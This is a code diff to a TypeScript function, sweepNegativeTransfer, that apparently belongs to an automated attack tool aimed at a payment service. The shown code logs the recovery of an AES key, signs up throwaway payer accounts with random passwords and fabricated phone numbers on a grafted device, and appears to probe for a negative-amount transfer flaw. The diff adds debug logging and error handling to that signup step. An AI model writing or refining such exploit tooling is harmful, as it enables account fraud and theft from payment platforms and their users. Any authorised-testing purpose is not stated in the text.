@@ -661,6 +661,9 @@ async function sweepNegativeTransfer(
   };
 
   dbg("AES recovered — signing up throwaway payer");
+  let signupParsed: unknown;
+  try { signupParsed = JSON.parse(signupTemplate); } catch { dbg(`signupTemplate is not JSON (${signupTemplate.slice(0, 40)}) — abort`); return proved; }
+  void signupParsed;
   // Signup + login a throwaway payer, device grafted.
   const uniq = randomUUID().replace(/-/g, "").slice(0, 10);
   const P1 = `S${randomUUID().replace(/-/g, "").slice(0, 14)}z9`;
@@ -674,7 +677,9 @@ async function sweepNegativeTransfer(
     else if (k === "mobile") sAssign.push([leaf, `9${Array.from({length:9},()=>Math.floor(Math.random()*10)).join("")}`]);
   }
   const signupBody = build(signupTemplate, sAssign);
-  const sResp = await fire("POST", signupUrl, jsonHdr, signupBody, null);
+  dbg(`signup POST ${signupUrl} bodylen=${signupBody.length}`);
+  const sResp = await fire("POST", signupUrl, jsonHdr, signupBody, null).catch((e) => { dbg(`signup fire threw: ${(e as Error)?.message}`); return null; });
+  dbg(`signup resp status=${sResp?.response.status ?? "null"}`);
   const P = extractAssignedId(sResp?.response.body);
   if (!P) { dbg(`signup failed (${(sResp?.response.body ?? "").slice(0, 70)})`); return proved; }
   dbg(`payer signed up: ${P}`);
